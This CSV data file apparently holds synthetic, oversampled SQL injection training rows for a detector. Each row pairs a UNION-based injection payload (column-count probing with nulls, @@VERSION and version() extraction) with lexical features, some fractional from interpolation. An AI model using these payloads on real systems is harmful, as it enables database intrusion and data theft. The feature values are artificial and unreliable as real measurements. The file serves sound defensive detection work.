id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000278,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000085,0.1458555015927432,68.68414578810088,25.0,4.039416333692078,36.431462418581575,9.347439633089037,14.968414578810087,7.936829157620175,0.5294663504599353,0.13702186749944378,0.21801975414305647,0.11549202789756449,2.9368291576201755,0.0,0.03158542118991248,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9684145788100875,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9684145788100875
SMOTE_000279,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,1.0035216880445834,79.0,31.16613050029509,4.11850364894074,40.0,2.354233687463113,23.70846737492623,12.937298937610658,0.5063291139240507,0.029800426423583742,0.3001071819610915,0.16376327769127416,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000280,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.01800720054646719,71.09581989693002,22.009581989693,3.8651673225204446,14.000000000000002,32.07665591754402,14.0,11.019163979386004,0.19694983853990253,0.45111742887217254,0.19694983853990256,0.15498289404802226,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.019163979386004,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8033712858601902,56.379963046593375,17.0,3.307239620188496,37.240073906813244,1.0,9.139889139780133,9.0,0.6610238740797394,0.017740159160531593,0.1615745343149447,0.15966143244478437,0.8100184767033112,0.18998152329668863,0.0,0.0,0.0,0.0,0.0,1.1899815232966888,1.0,0.0,4.810018476703311,0.0,0.8100184767033112,0.18998152329668866,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.7327352291130539,60.983047236156196,24.433415075383945,3.949301707628636,30.69975477384817,9.0,15.433415075383943,5.849877386924086,0.5025108273776354,0.14795905877621834,0.2544537066433368,0.09507640720280945,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.849877386924085,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000283,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.6102797848813569,75.83953579414636,16.0,3.119031281180979,50.0,1.0,12.148173537839732,12.691362256306622,0.6605314572576169,0.013210629145152336,0.158866745184805,0.16739116841242577,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.691362256306622,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.987824895473335,72.1233286607648,31.5616643303824,4.3770988479500845,44.0,1.9999999999999982,16.1233286607648,10.0,0.6101820449404494,0.02773554749729315,0.22340467007579173,0.13867773748646575,0.0,0.0,2.0,0.0,1.4383356696176013,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000285,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.6749493586024683,61.28684063833859,25.76228021277953,4.0793748486236225,25.95087914888188,14.335961489456711,16.0,5.0,0.424216372682398,0.23297981468914666,0.2611838572407279,0.08161995538772746,0.2377197872204701,0.0,2.7622802127795296,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.76228021277953,0.23771978722047007,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.6313718226781242,63.319386392893946,21.840306803553027,3.9324717386704795,19.461994223094678,25.277545571575782,9.26046020532954,9.319386392893946,0.31085957503168693,0.39566711162164436,0.14713110269943722,0.14634221064723155,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.3193863928939455,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,1.0537207784696858,76.53238530611931,26.0,3.8697711950671576,40.0,3.597155918357915,23.467614693880698,9.467614693880694,0.5226767921659651,0.04687612426229715,0.30669198041491275,0.12375510315682497,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.532385306119305,0.0,0.0,1.0,0.5323853061193048,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000288,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.5872987533729871,70.72471015515148,15.787451692525245,3.114197787339888,41.14980677010099,1.0,18.0,10.574903385050492,0.5817231188827671,0.014157257963983289,0.2548306433516989,0.14928897980155076,0.7874516925252462,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.787451692525246,0.0,0.7874516925252462,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.7845405361163211,72.73253552503303,19.0,3.645438255988912,14.000000000000002,42.73253552503303,4.0,12.0,0.19261476885126205,0.5872540667472956,0.05503279110036058,0.1650983733010818,0.3168661187417416,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.683133881258257,3.0,0.31686611874174153,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.45882206170237544,77.5015207166485,26.800608286659404,4.146634126795689,30.196350280043585,22.504562149945517,15.0,9.800608286659402,0.39072202688103147,0.2893079294865097,0.19362086217953503,0.12634918145292381,2.8006082866594024,0.0,1.0996958566702988,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,3.099695856670299,1.0,0.0,0.09969585667029895,0.900304143329701,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000291,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,1.4020075010897732,68.06388075625836,22.0,3.6705465634147796,14.000000000000002,29.677782424995222,13.805543937511947,10.580554393751195,0.20622924062772513,0.4386738316460006,0.1996135048306993,0.155483422895575,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.161108787502389,0.0,0.0,5.4194456062488054,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.39229800203798504,55.136285370980616,16.13628537098062,3.248100657677602,38.0,1.0,8.0,8.13628537098062,0.689227648020369,0.018137569684746585,0.1451005574779724,0.14753422481691206,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.1362853709806195,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.6214732168412405,76.0,26.0,3.8491314614531666,40.52338520892784,2.5233852089278432,24.0,8.953229582144314,0.5332024369595769,0.033202436959576864,0.3157894736842105,0.1178056523966357,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000294,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,4.658467027623051,69.15122118739878,25.19324706722983,4.03488788054078,37.722701173108064,14.109195307567727,10.638649413445966,6.680675293277017,0.5516919033419077,0.1965950107111072,0.15384615384615385,0.0978669321008313,0.0,1.957974120168949,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0420258798310513,1.0,0.0,1.0,0.0,0.6806752932770169,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.680675293277017,0.0,0.3193247067229829,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000295,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.33609363475421555,64.06197051091372,21.104225498787365,3.867411932304438,14.000000000000002,31.166196009701093,8.0,10.895774501212637,0.21899242111187028,0.48566474842893725,0.12513852634964015,0.1702043041095523,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.10422549878736355,0.0,5.791549002425273,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,1.4408003722669422,73.44523253450282,22.828139539181308,3.86800743016739,41.687441843274776,9.0,15.585930230409346,7.171860460818693,0.5667020665370849,0.12322864661107438,0.21289300371601302,0.09717628313582771,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.7577906912280405,1.4140697695906532,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4140697695906532,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.414069769590653
SMOTE_000297,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.6984145452820762,66.23235614122818,19.748823742748545,3.7263004659914167,14.000000000000002,36.98588491298255,4.0,11.246471228245637,0.2137005231228066,0.5557708307167923,0.06105729232080187,0.16947135383959905,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.246471228245637,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.3977494579244318,55.48558188525453,16.485581885254533,3.2730424390826243,38.0,1.0,8.0,8.485581885254533,0.684918145571535,0.01802416172556673,0.14419329380453366,0.15286439889836462,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.4855818852545333,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,1.4585509260508234,78.38049810982628,23.141494329478824,3.86432016546442,45.0,9.0,16.0,8.380498109826275,0.5741443662865656,0.11482887325731311,0.20414021912411223,0.10688654133200896,1.0,0.0,0.7609962196525502,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,1.7609962196525504,1.0,0.0,0.3804981098262752,0.6195018901737248,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000300,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,1.8256301482058228,65.0,22.0,3.79950232466787,39.0,9.0,10.0,7.0,0.6,0.13846153846153847,0.15384615384615385,0.1076923076923077,0.5078963457232276,0.49210365427677233,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,1.0,0.5078963457232276,0.4921036542767724,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000301,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.4217762092741585,58.306501890719375,24.306501890719375,3.941701189122849,27.266254726798433,10.213621691241098,15.653250945359687,5.173374527320157,0.4662004542527722,0.17653163721625592,0.2683013175731006,0.0889665909578713,1.0,0.0,2.173374527320157,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.173374527320157,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.02952988877286082,77.89546062432865,16.0,3.1210109963653756,50.0,1.0,13.910394820853133,12.985065803475521,0.6419694779313051,0.012839389558626096,0.17848940904404897,0.16670172346601989,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.985065803475522,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000303,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000069,0.11953859212822833,64.56547990831679,19.226191963326713,3.6288436118933878,14.000000000000002,36.452383926653425,4.0,10.113095981663356,0.216957264783416,0.5644463982351484,0.06198778993811886,0.1566085470433168,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.113095981663356,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,1.4761535918950996,67.42964826874608,27.2814069250157,4.028510873771987,22.422110387523546,23.437186149968603,15.14070346250785,6.429648268746075,0.332866591142543,0.34716824114858974,0.22466039501494484,0.09530477269392243,0.0,0.5703517312539246,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.8592965374921508,2.0,0.0,0.5703517312539246,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000305,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,0.6886374692018027,60.84688514211872,25.794790539764588,4.023874632588655,19.0,21.641675681883306,14.0,6.205209460235413,0.3132874332751107,0.35391853499220854,0.23084337188692372,0.101950659845757,0.0,0.7947905397645867,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.410418920470827,2.0,0.0,0.7947905397645867,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000306,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.7656452078018696,69.442280384806,22.769121539224003,3.744091869624459,36.346317691163996,9.0,17.538243078448005,6.557719615193999,0.5237364359591887,0.12961065766806334,0.25216290828687954,0.09448999808586832,0.0,0.4422803848060004,0.0,0.0,0.0,1.0,0.0,1.4422803848060004,0.0,0.0,2.673158845581999,1.0,0.0,0.4422803848060004,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000307,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.1943218800091248,61.399738056735494,16.0,3.2150974628460736,41.771578253294,1.0,8.571054366764994,10.0571054366765,0.6811179544522765,0.016297073756813968,0.1387744483892914,0.163810523401618,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.114210873352999,0.0,0.0,5.942894563323501,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000308,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,1.8594050714641985,55.50869987476274,16.0,3.2565253439130295,38.0,1.0,8.0,8.508699874762737,0.6846329236230572,0.018016655884817295,0.14413324707853833,0.15321717341358723,1.0,0.0,1.0173997495254752,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.0,1.017399749525475,1.0,0.0,0.5086998747627376,0.4913001252372625,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000309,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.4764280829620094,70.5622492074198,21.284045310439964,3.6839585651591333,40.13618124175985,9.0,14.0,7.426067965659945,0.5683820265565321,0.12788763716181553,0.1989363244739353,0.10479401180771696,0.14202265521998148,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.2840453104399625,1.0,0.14202265521998153,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000310,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.9541190975811235,70.49102059033359,14.491020590333584,2.9377508592862833,54.0,1.0,4.0,11.491020590333585,0.7661676365321402,0.014188289565409962,0.05675315826164001,0.16289091564080982,0.24551029516679268,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.24551029516679268,0.0,9.0,2.0,0.2455102951667927,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
